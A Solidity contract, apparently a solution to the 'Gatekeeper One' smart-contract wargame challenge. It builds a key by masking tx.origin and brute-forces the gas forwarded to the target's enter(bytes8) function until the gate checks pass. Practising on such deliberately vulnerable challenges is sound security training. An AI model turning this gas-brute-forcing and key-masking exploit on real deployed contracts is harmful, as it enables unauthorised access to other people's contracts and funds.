// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

contract GatekeeperOneAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 8191; i++) { 
            (bool result,) = challengeInstance.call{gas:i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)",key));
            if (result) {
                break;
            }
        }
    }
}